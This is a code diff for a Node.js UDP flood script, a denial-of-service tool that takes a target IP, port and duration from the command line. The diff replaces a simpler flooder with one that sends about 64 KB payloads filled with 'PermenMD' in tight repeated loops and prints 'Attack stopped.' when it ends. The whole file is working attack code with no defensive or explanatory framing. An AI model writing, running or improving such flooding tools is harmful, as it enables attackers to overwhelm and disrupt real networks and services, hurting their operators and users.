@@ -1,33 +1,53 @@
-const dgram = require("dgram");
+const dgram = require('dgram');
 
-function udpFlood(targetIP, targetPort, duration) {
-    const socket = dgram.createSocket("udp4");
-    const message = Buffer.alloc(1024, "A"); // Paket 1024 byte berisi karakter 'A'
-    
-    console.log(`🚀 Starting UDP flood to ${targetIP}:${targetPort} for ${duration} seconds...`);
-    
-    const startTime = Date.now();
-    const interval = setInterval(() => {
-        if (Date.now() - startTime > duration * 1000) {
-            clearInterval(interval);
-            socket.close();
-            console.log("✅ Flood stopped.");
-        } else {
-            socket.send(message, targetPort, targetIP, (err) => {
-                if (err) console.error("❌ Error:", err.message);
-            });
+const target = process.argv[2];
+const port = process.argv[3];
+const duration = process.argv[4]
+function generatePayload(size) {
+    let payload = Buffer.alloc(size);
+    payload.fill('PermenMD');
+    return payload;
+}
+
+const payload = generatePayload(65500);
+
+setInterval(() => {
+    const socket = dgram.createSocket('udp4');
+    for (let p = 0; p < 50; p++) {
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+socket.send(payload, 0, payload.length, port, target);
+    }
+    socket.send(payload, 0, payload.length, port, target, (err) => {
+        if (err) {
+            console.error('Error sending message:', err);
         }
-    }, 1);
-}
+        socket.close();
+    });
+});
 
-const args = process.argv.slice(2);
-if (args.length !== 3) {
-    console.log(`Usage: node ${process.argv[1]} <target IP> <port> <time>`);
-    process.exit(0);
-}
-
-const targetIP = args[0];
-const targetPort = parseInt(args[1], 10);
-const duration = parseInt(args[2], 10);
-
-udpFlood(targetIP, targetPort, duration);
+console.clear();
+console.log(``);
+    setTimeout(() => {
+        console.log('Attack stopped.');
+        process.exit(0);
+    }, duration * 1000);
